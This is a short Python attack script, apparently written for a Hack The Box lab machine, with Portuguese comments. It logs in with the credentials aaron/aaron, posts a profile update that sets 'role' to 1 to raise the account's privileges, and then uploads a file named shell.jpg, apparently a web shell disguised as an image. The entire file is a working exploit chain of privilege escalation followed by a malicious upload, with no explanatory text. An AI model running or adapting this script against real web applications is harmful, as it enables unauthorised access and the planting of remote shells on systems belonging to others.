#!/usr/bin/python3
# coding:utf-8

from pwn import *
import requests

def def_handler(sig, frame):
	print("\n[!]Saindo\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_global
main_url = "http://10.10.11.135/login.php?login=true"
upload_url = "http://10.10.11.135/upload.php"
update_profile = "http://10.10.11.135/profile_update.php"
admin_check = "http://10.10.11.135/admin_auth_check.php"

def makeRequest():
	s = requests.session()

	data_post = {
		'user': 'aaron',
		'password': 'aaron'
	}

	r = s.post(main_url, data=data_post)

	# r = s.get(upload_url, allow_redirects=False)

	data_post = {
		'firstName': 'hack',
		'lastName': 'hack',
		'email': 'hack@hack.htb',
		'company': 'hack',
		'role': '1'
	}
	
	r = s.post(update_profile, data=data_post)

	with open("/tmp/shell.jpg", "rb") as img:
		uploadFile = {'fileToUpload': ('shell.jpg', img)}

		r = s.post(upload_url, files=uploadFile)

		print(r.text)

if __name__ == '__main__':
	makeRequest()
